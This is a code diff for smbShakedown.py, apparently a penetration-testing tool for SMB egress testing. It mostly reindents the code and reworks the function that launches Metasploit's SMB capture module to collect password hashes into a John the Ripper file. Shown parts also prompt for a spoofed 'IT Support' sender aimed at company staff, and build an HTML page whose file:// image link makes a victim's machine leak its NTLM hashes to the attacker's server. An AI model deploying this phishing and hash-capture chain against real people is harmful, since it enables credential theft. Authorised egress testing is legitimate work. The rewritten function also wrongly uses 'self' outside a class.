@@ -11,16 +11,16 @@ import SocketServer, SimpleHTTPServer, multiprocessing
 rcfile = 'smbServ.rc'
 
 class colors:
-   white = "\033[1;37m"
-   normal = "\033[0;00m"
-   red = "\033[1;31m"
-   blue = "\033[1;34m"
-   green = "\033[1;32m"
-   x = "\033[1;35m"
+	white = "\033[1;37m"
+	normal = "\033[0;00m"
+	red = "\033[1;31m"
+	blue = "\033[1;34m"
+	green = "\033[1;32m"
+	x = "\033[1;35m"
 
 banner = colors.x + r"""
-                  __        
-                 /\ \       
+				  __        
+				 /\ \       
   ____    ___ ___\ \ \____  
  /',__\ /' __` __`\ \ '__`\ 
 /\__, `\/\ \/\ \/\ \ \ \L\ \
@@ -33,7 +33,7 @@ banner = colors.x + r"""
  \/_\__ \\ \  _ `\  /'__`\ \ \ , <    /'__`\ /'_` \  / __`\/\ \/\ \/\ \ /' _ `\  
    /\ \L\ \ \ \ \ \/\ \L\.\_\ \ \\`\ /\  __//\ \L\ \/\ \L\ \ \ \_/ \_/ \/\ \/\ \ 
    \ `\____\ \_\ \_\ \__/.\_\\ \_\ \_\ \____\ \___,_\ \____/\ \___x___/'\ \_\ \_\
-    \/_____/\/_/\/_/\/__/\/_/ \/_/\/_/\/____/\/__,_ /\/___/  \/__//__/   \/_/\/_/
+	\/_____/\/_/\/_/\/__/\/_/ \/_/\/_/\/____/\/__,_ /\/___/  \/__//__/   \/_/\/_/
 
 """+'\n' \
 + colors.x + '\n smbShakedown.py v1.10252016.b' \
@@ -42,7 +42,7 @@ banner = colors.x + r"""
 + colors.normal + ' ' + '*' * 95 +'\n' + colors.normal
 
 def cls():
-    os.system('cls' if os.name == 'nt' else 'clear')
+	os.system('cls' if os.name == 'nt' else 'clear')
 
 def get_external_address():
 	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
@@ -56,48 +56,54 @@ def get_internal_address():
 	return s.getsockname()[0]
 
 def yes_no(answer):
-    yes = set(['yes','y', 'ye', ''])
-    no = set(['no','n'])
-     
-    while True:
-        choice = raw_input(answer).lower()
-        if choice in yes:
-           return True
-        elif choice in no:
-           return False
-        else:
-            print ('Please respond with \'yes\' or \'no\'\n')
-
-def smbServ():
-	
-	'''smbServOption = raw_input("\nLaunch Metasploit's SMB Capture module?[yes]:") or 'yes'
-	
-
-	choice = smbServOption.lower()
 	yes = set(['yes','y', 'ye', ''])
 	no = set(['no','n'])
-	print('ENTERED: "%s"' % choice + "\n")
-	
+	 
+	while True:
+		choice = raw_input(answer).lower()
+		if choice in yes:
+		   return True
+		elif choice in no:
+		   return False
+		else:
+			print ('Please respond with \'yes\' or \'no\'\n')
 
-	if choice in yes:'''
-
-	smbServOption = yes_no('\nLaunch Metasploit\'s SMB Capture module? (y/n): ')
-	if smbServOption is True:
-
-		with open(rcfile, 'w') as f1:
-			f1.write("use auxiliary/server/capture/smb"+"\n"+\
-				"set srvhost "+get_internal_address()+"\n"+\
-				"set JOHNPWFILE /opt/smbShakedown/smb_hashes"+"\n"+\
-				"exploit -j -z")
-		os.system('msfconsole -q -r smbServ.rc')
-	else:
-		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")
-	
-
-	'''elif choice in no:
-		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")
-	else:
-		sys.stdout.write("Please respond with 'yes' or 'no'")'''
+def smbServ():
+	'''starts a metasploit smb capture server in a tmux session called msf_shakedown'''
+	smb_server_option = self.yes_no('Use a local Metasploit SMB capture server in a screen session called msf_shakedown? (y/n): ')
+	#FEATURE need to allow a choice of internal or external ip?
+	if smb_server_option is True:
+		rc_config = \
+		'use auxiliary/server/capture/smb\n'+\
+		'set srvhost {}\n'.format(self.internal_ip)+\
+		'set JOHNPWFILE /opt/smbShakedown/smb_hashes\n'+\
+		'exploit -j -z'
+		print('\n{}\n').format(str(rc_config))
+		#prompt user to ok the rc file config
+		validate_rc_file = self.yes_no('rc file ready to execute? (y/n): ')
+		#if they ok the file
+		if validate_rc_file is True:
+			#write the file
+			with open(self.rc_file, 'w') as rc_file:
+				rc_file.writelines(str(rc_config))
+				rc_file.close()
+			#use subprocess to open tmux new session and run msfconsole in it   
+			try:
+				print('Starting tmux...')
+				proc = subprocess.Popen(['tmux', 'new-session', '-d', '-s', 'msf_shakedown',\
+				 'msfconsole -q -r {}'.format(self.rc_file)], stdout=subprocess.PIPE)
+				(out, err) = proc.communicate()
+				print('Screen sessions: {}'.format(out))
+			except Exception as e:
+				print('Error: {}'.format(e))
+				sys.exit(1)
+		#if user opts to not run msfconsole smb capture locallly, provide a sample rc file
+		else:
+			print('You\'ll need to provide your own rc file. Here\'s a sample')
+			print('use auxiliary/server/capture/smb\n\
+set srvhost <YOUR.IP.ADDRESS.HERE>\n\
+set JOHNPWFILE /opt/smbShakedown/smb_hashes\n\
+exploit -j -z')
 
 
 
@@ -174,7 +180,7 @@ def main():
 	print("\n")
 	senderName = raw_input('Enter "from name":[IT Support]') or  'IT Support'
 	print('ENTERED:' "%s" % senderName + "\n")
-	senderAddress = raw_input('Enter "from address":[itsupport@company.com]') or  'itsupport@company.com'
+	senderAddress = raw_input('Enter "from address":[itsupport@company.com]') or 'itsupport@company.com'
 	print('ENTERED:' "%s" % senderAddress + "\n")
 	recipientName = raw_input('Enter recipient(s) name[Company Staff]: ') or 'Company Staff'
 	print('ENTERED:' "%s" % recipientName + "\n")
@@ -260,14 +266,14 @@ def main():
 			html = """
 			<!DOCTYPE HTML>
 			<html lang="en-US">
-	    		<head>
-	        		<meta charset="UTF-8">
-	        		<meta http-equiv="refresh" content="1;url={1}">
-	        		<script type="text/javascript">
-	            		window.location.href = "{1}"
-	        		</script>
-	        <title>SMB Egress Test Page.</title>
-	    	</head>
+				<head>
+					<meta charset="UTF-8">
+					<meta http-equiv="refresh" content="1;url={1}">
+					<script type="text/javascript">
+						window.location.href = "{1}"
+					</script>
+			<title>SMB Egress Test Page.</title>
+			</head>
 			<br>
 			<img src=file://{0}/image/foo.gif>
 			</body>
